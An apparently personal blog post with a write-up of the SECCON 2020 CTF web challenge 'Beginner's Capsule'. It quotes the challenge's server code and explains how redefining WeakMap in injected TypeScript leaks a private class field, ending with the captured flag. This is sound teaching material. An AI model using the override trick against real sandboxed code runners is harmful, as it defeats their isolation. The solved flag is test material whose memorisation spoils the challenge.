---
layout: post
title:  "SECCON 2020 CTF"
date:   2020-10-11
categories: ["2020","web","ctf"]
update:   2020-10-11
comment: true
tags: [web,ctf]
---

# SECCON 2020 CTF

ì˜ì‘ ì—°ìŠµ ê²¸ ì˜ì–´ë¡œ í•œë²ˆ ì¨ë´¤ë‹¤. 

Sorry for bad english ğŸ¤£

## Beginner's Capsule

![image](https://user-images.githubusercontent.com/51329156/95663016-6e545880-0b76-11eb-83a0-e53665f5faa0.png)

From **server.ts**, our injected code is executed by `execute()` in **runner.ts**.

ğŸ” **Part of server.ts** :

``` typescript
  try {
    const result = await execute(params.code.toString());

    reply.type('text/plain');
    reply.send(result);
    console.log(`POST / 200 ${JSON.stringify(params.code)}`);
  } catch (e) {
    console.error(e);
    console.log(`POST / 500 ${JSON.stringify(params.code)}`);
  }
```

ğŸ” **Part of runner.ts**

``` typescript
const HEADER = `
import * as fs from 'fs';
// @ts-ignore
import {enableSeccompFilter} from './lib.js';

class Flag {
  #flag: string;
  constructor(flag: string) {
    this.#flag = flag;
  }
}

const flag = new Flag(fs.readFileSync('flag.txt').toString());
fs.unlinkSync('flag.txt');

enableSeccompFilter();

`;
...
export const execute = async (code: string) => {
  const {tmpPath, cleanup} = await new BluePromise((resolve, reject) => {
    tmp.dir({unsafeCleanup: true}, (error, dTmpPath, dCleanup) => {
      if (error) {
        reject(error);
      } else {
        resolve({tmpPath: dTmpPath, cleanup: dCleanup});
      }
    });
  });

  const libPath = path.join(tmpPath, 'lib.js');
  const flagPath = path.join(tmpPath, 'flag.txt');
  const codePath = path.join(tmpPath, 'index.ts');

  await BluePromise.all([
    fs.writeFile(libPath, LIB),
    fs.writeFile(flagPath, process.env.FLAG),
    fs.writeFile(codePath, HEADER + code),
  ]);
    ...
    const containerPromise = (async () => {
    container = await docker.createContainer({
      Hostname: '',
      User: '',
      AttachStdin: false,
      AttachStdout: true,
      AttachStderr: true,
      Tty: false,
      OpenStdin: false,
      StdinOnce: false,
      Env: null,
      Cmd: ['/node_modules/.bin/ts-node', 'index.ts'], // run index.ts
      Image: 'beginners_capsule',
      WorkingDir: '/volume',
      Volumes: {
        '/volume': {},
      },
      HostConfig: {
        Binds: [`${dockerVolumePath}:/volume:rw`],
        Memory: 512 * 1024 * 1024,
      },
    });
    ...
   
```

So, our code is injected to **index.ts** and run it.

By `HEADER`, `flag` which is instance of `Flag` has **flag** in private class fields. 

> ğŸš€ [https://devblogs.microsoft.com/typescript/announcing-typescript-3-8-beta/#ecmascript-private-fields](https://devblogs.microsoft.com/typescript/announcing-typescript-3-8-beta/#ecmascript-private-fields)

This release note said that `TypeScript 3.8 ~` supports **ECMAScript Private Fields** which starts with `#` notation. I tried to refer `#flag` from the outside of containing class, but like note said, it canâ€™t be accessed or even detected outside of the containing class. So, I came up with two ideas.

1.  read `flag.txt` before removed.
2. overwrite part of `Flag` 

At the beginning I tried to solve with firts method,  but I have no point to **read** `flag.txt`  before it is removed. So, I moved on to second method.

Because I've never used typescript and private fields before, I don't know how **typescript and private fields** works. After googling, I found interesting article.

> ğŸš€ https://www.aaron-powell.com/posts/2020-01-23-typescript-ecmascript-class-private-fields/

`ts-node` transpile typescript to javascript doing same thing, and private fields is converted to instance of a `WeakMap`.  

**before**

```typescript
class Person {
    #name: string

    constructor(name: string) {
        this.#name = name;
    }

    greet() {
        console.log(`Hello, my name is ${this.#name}!`);
    }
}
```

**after**

```javascript
var _name;
class Person {
    constructor(name) {
        _name.set(this, void 0);
        __classPrivateFieldSet(this, _name, name);
    }
    greet() {
        console.log(
            `Hello, my name is ${__classPrivateFieldGet(this, _name)}!`
        );
    }
}
_name = new WeakMap();
```

We can overwrite `WeakMap`. Now, what can we do to get the flag?

By the javascript code, `__classPrivateFieldSet` sets value of private fields to argument[2].

```javascript
var __classPrivateFieldSet =
    (this && this.__classPrivateFieldSet) ||
    function(receiver, privateMap, value) {
        if (!privateMap.has(receiver)) {
            throw new TypeError(
                "attempted to set private field on non-instance"
            );
        }
        privateMap.set(receiver, value);
        return value;
    };
```

This function checks `privateMap.has()` then do `privateMap.set()`.

So, If we can overwrite `WeakMap`, we can also overwrite `has` and `set` which uses contents of `flag.txt` for parameter. 

Let's go back to the our `index.ts`.

``` typescript
class Flag {
  #flag: string;
  constructor(flag: string) {
    this.#flag = flag;
  }
}

const flag = new Flag(fs.readFileSync('flag.txt').toString());
```

This code will converted to following code:

``` javascript
"use strict";
var __classPrivateFieldSet = (this && this.__classPrivateFieldSet) || function (receiver, privateMap, value) {
    if (!privateMap.has(receiver)) {
        throw new TypeError("attempted to set private field on non-instance");
    }
    privateMap.set(receiver, value);
    return value;
};
var _flag;
exports.__esModule = true;
var fs = require("fs");
// @ts-ignore
var lib_js_1 = require("./lib.js");
var Flag = /** @class */ (function () {
    function Flag(flag) {
        _flag.set(this, void 0);
        __classPrivateFieldSet(this, _flag, flag);
    }
    return Flag;
}());
_flag = new WeakMap();
var flag = new Flag(fs.readFileSync('flag.txt').toString());
```

` Flag(fs.readFileSync('flag.txt').toString())` gets the flag and sets the value of `_flag` which is instance of `WeakMap` to flag. 

Now, Let's make our own `WeakMap`:

```typescript
function WeakMap(...flag) {
  return {
    set: (...flag)=>{
      console.log(flag)
    },
    has: () => {return true;}
  }
}
```

`set` will log the flag, and `has` will ignore `if` statement because its return value is `true`.

`...(spread operator)` can expand in places where 0+ arguments are expected, and it becomes one-dimensonal array. 

![image](https://user-images.githubusercontent.com/51329156/95664120-cf345e80-0b7f-11eb-94ed-a09db7daa249.png)

ğŸ **FLAG** : SECCON{Player_WorldOfFantasy_StereoWorXxX_CapsLock_WaveRunner}

## Capsule



